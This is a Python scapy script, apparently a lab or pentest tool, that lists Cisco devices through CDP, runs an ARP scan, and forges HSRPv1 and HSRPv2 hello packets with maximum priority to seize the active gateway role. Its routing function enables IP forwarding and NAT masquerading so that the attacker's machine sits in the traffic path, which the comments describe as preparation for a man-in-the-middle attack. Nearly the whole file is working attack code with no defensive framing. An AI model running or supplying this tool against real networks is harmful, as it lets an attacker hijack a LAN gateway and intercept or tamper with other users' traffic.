import os
import time
import sys
import argparse

from scapy.all import *
load_contrib("cdp")

#Variable initialisation
interface = "eth0"
capturefilter = "ether dst 01:00:0c:cc:cc:cc"
sourceaddress = ""
virtualaddress = ""
activerouter = ""


#Routing commands for Linux. To prepare for man in the middle attack
def routing():
    os.system(f'ifconfig eth0:1 {virtualaddress} netmask 255.255.255.240')
    os.system(f'echo 1 > /proc/sys/net/ipv4/ip_forward')
    os.system(f'route add -net 0.0.0.0 netmask 0.0.0.0 gw {activerouter}')
    os.system(f'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE')


'''Sniffer function to capture 2 packets of CDP. Passes the packet to the function
cdp_monitor_callback which formats the CDP message to a readable format.
'''
def cdp_sniffer():
    p = sniff(prn=cdp_monitor_callback, iface=interface,
              count=2, filter=capturefilter, store=0)

#Formats CDP message
def cdp_monitor_callback(pkt):
    ip = "0.0.0.0"
    if (CDPMsgDeviceID in pkt):
        device = pkt["CDPMsgDeviceID"].val.decode()
        hostname = device.split(".")[0]
        if (CDPAddrRecordIPv4 in pkt):
            ip = pkt["CDPAddrRecordIPv4"].addr
        return "Device: {0} IP: {1}".format(hostname, ip)

'''Used the inbuilt Kali Linux ARP scanner. 
Difference between building in scapy vs using Kali one is that kali automatically maps
MAC addresses to the manufacturer for easier identification.
'''
def ARPscan():
    os.system('arp-scan -l')

#Default fields Group state TLV for HSRPv2 packet
#Paddings are added between certain fields. HSRPv2 has some fields longer than v1 hence packet is different
class GrpStateTLV(Packet):  
    name = "Group State TLV"
    fields_desc = [
        ByteField("type", 1),
        ByteField("len", 40),
        ByteField("version", 2),
        ByteEnumField("opcode", 0, {0: "Hello", 1: "Coup", 2: "Resign"}),
        ByteEnumField("state", 6, {0: "Disabled", 1: "Initial", 2: "Learn",
                      3: "Listen", 4: "Speak", 5: "Standby", 6: "Active"}),
        ByteEnumField("ipver", 0, {4: "IPv4", 6: "IPv6"}),
        ByteField("Pad", 0),
        XByteField("group", 1),
        StrFixedLenField("Identifier", b"\cc"+b"\05" +
                         b"\58"+b"\c0"+b"\f2"+b"\4f", 6),
        StrFixedLenField("padding1", b"\00"*3, 3),
        ByteField("priority", 150),
        StrFixedLenField("padding2", b"\00"*2, 2),
        ByteField("hellotime1", 11),
        ByteField("hellotime2", 184),  #Building hellotime of 3000
        StrFixedLenField("padding3", b"\00"*2, 2),
        ByteField("holdtime1", 39),
        ByteField("holdtime2", 16),  #Building the holdtime of 10000.
        IPField("virtualIP", "192.168.1.1"),
        StrFixedLenField("padding4", b"\00"*12, 12)]

#Default fields for text authentication
class TextAuthTLV(Packet): 
    name = "Text Authentication TLV"
    fields_desc = [
        ByteField("type", 3),
        ByteField("len", 8),
        StrFixedLenField("auth", b"cisco" + b"\00" * 3, 8)]

#HSRPv1 attack. Attack fields based on scapy's default hsrp.py file
def hsrpattack(): 
    ip = IP(src=sourceaddress, dst='224.0.0.2')
    udp = UDP(sport=1985, dport=1985)
    hsrp = HSRP(group=1, priority=255,
                virtualIP=virtualaddress)
    routing()
    send(ip/udp/hsrp, inter=3, loop=1)

#HSRPv2 attack. Fields are crafted manually through GrpstateTLV and TextAuthTLV classes
def hsrpattackv2():
    d = GrpStateTLV(state=6, ipver=4, priority=255,
                    group=1, virtualIP=virtualaddress)
    a = TextAuthTLV(type=3)
    ip = IP(src=sourceaddress, dst='224.0.0.102')
    udp = UDP(sport=1985, dport=1985)
    routing() #Call the routing function.
    send(ip/udp/d/a, inter=3, loop=1)


def menu():
    print("[1]Check for CDP devices:")
    print("[2]ARP scanning:")
    print("[3]HSRP:")
    print("[4]HSRPv2:")
    print("[0]Exit program")

#Menu functions for ease of use.
menu()
option = int(input("Enter your option:"))
while option != 0:
    if option == 1:
        cdp_sniffer()
    elif option == 2:
        ARPscan()
    elif option == 3:
        sourceaddress = input("Enter source address:")
        virtualaddress = input("Enter virtual IP address:")
        activerouter = input("Enter active router address:")
        hsrpattack()
    elif option == 4:
        sourceaddress = input("Enter source address:")
        virtualaddress = input("Enter virtual IP address:")
        activerouter = input("Enter active router address:")
        hsrpattackv2()
    else:
        print("Invalid option")
    menu()
    option = int(input("Enter your option:"))
